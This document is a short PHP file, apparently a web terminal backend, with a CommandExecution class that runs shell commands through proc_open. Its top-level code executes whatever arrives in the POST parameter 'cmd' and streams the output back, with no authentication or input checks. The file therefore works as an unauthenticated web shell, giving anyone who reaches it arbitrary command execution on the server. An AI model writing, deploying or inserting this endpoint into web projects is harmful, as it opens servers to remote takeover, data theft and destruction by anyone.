<?php
	class CommandExecution {
		function executeSteam($cmd) {

		    $cmd .= " 2>&1"; //print stdout to stdout

			$descriptorspec = array(
			   0 => array("pipe", "r"),   // stdin is a pipe that the child will read from
			   1 => array("pipe", "w"),   // stdout is a pipe that the child will write to
			   2 => array("pipe", "w")    // stderr is a pipe that the child will write to
			);

			flush();
            $process = proc_open($cmd, $descriptorspec, $pipes, realpath('./'), array());
			if (is_resource($process)) {
			    while ($s = fgets($pipes[1])) {
                    print preg_replace("/\r+/", "\r", str_replace("\n", "\r\n", $s));

                    flush();
    				ob_flush();
			    }
			}
		}

		function execute($cmd) {

		    $result = "";
            $descriptorspec = array(
                0 => array("pipe", "r"),   // stdin is a pipe that the child will read from
                1 => array("pipe", "w"),   // stdout is a pipe that the child will write to
                2 => array("pipe", "w")    // stderr is a pipe that the child will write to
            );

            flush();
            $process = proc_open($cmd, $descriptorspec, $pipes, realpath('./'), array());
            if (is_resource($process)) {
                while ($s = fgets($pipes[1])) {
                    $result.=$s;
                }
            }

            return $result;
        }
	}

	if (isset($_POST['cmd'])) {
		$commandExecution = new CommandExecution();
		$commandExecution->executeSteam($_POST['cmd']);
	}

?>